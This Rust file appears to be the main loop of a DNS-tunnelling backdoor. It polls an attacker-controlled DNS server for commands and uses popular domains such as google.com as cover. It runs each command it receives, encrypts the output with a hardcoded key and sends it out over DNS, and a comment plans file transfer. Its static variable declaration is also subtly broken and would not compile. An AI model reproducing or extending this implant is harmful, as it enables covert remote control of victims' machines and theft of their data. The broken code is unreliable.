mod request;
mod utils;
mod crypto;
use rand::seq::SliceRandom;
use std::process;

/*
TODO
1. Switch from std::process::Command to a more native way for executing commands
2. Maybe add the ability to download/upload files
3. Add the ability to reconfigure DNS server address
*/


//Domains for a random choosing, can be changed, 
//however make sure that they are not too long
const DOMAINS: [&str; 7] = [
    "google.com", 
    "amazon.com", 
    "linkedin.co", 
    "github.com", 
    "youtube.com", 
    "azure.com", 
    "apple.com"
    ];

//Sleep timer for polling the dns server
pub static mut SLEEP: u64 = 5;

//Address of the DNS Server to query
pub static mut DNS_SERVER: &str = String::new();

//Encryption key
pub static ENCRYPTION_KEY: &str = "Ql60hqrp1NhiCzH8XZRaJkUy2mU7COgV";



fn main() {

    //Initial value
    unsafe {
        DNS_SERVER = "192.168.1.16:53".to_string();
    }


    let mut rng = rand::thread_rng();

    loop {
        let domain = DOMAINS.choose(&mut rng).unwrap();
        // Get commands to execute
        let cmd: String = utils::get_commands(domain);

        // Configuration commands
        if cmd.starts_with("reconfigure_sleep") {
            utils::reconfigure_sleep(cmd);
            let _ = utils::exfiltrate_data(
                            crypto::encrypt("Sleep reconfigured".to_string().as_bytes()).unwrap(), 
                            domain
                    );
            continue;
        } else if cmd.starts_with("reconfigure_dnsaddr") {
            let _ = utils::exfiltrate_data(
                            crypto::encrypt("DNS server addr reconfigured".to_string().as_bytes()).unwrap(), 
                            domain
                    );
            utils::reconfigure_dnsserver(cmd);
            continue;
        } else if cmd == "kill_agent" {
            let _ = utils::exfiltrate_data(
                            crypto::encrypt("Agent process stopped".to_string().as_bytes()).unwrap(), 
                            domain
                    );
            process::exit(0);
        }

        if !cmd.is_empty() {
            // Execute the command
            let out = utils::execute(cmd);
            // Encrypt the output before sending
            let encrypted: String = crypto::encrypt(out.as_bytes())
                                        .expect("[!] Could not encrypt data");
                      
            let _ = utils::exfiltrate_data(encrypted, domain);
        }
        unsafe {
            std::thread::sleep(std::time::Duration::new(SLEEP, 0));
        }
    }
}